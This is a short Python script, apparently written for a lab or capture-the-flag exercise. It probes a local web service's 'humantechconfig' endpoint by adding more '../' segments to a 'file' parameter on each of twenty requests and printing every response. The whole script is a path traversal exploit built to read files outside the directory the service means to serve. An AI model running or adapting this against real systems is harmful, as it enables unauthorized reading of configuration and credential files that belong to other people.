from urllib.request import Request, urlopen

dir_level = "human.conf"

for i in range(20):
  req = Request(f"http://127.0.0.1:8082/humantechconfig?file={dir_level}")
  content = urlopen(req).read().decode()
  print(content)
  
  dir_level = f"../{dir_level}"
  
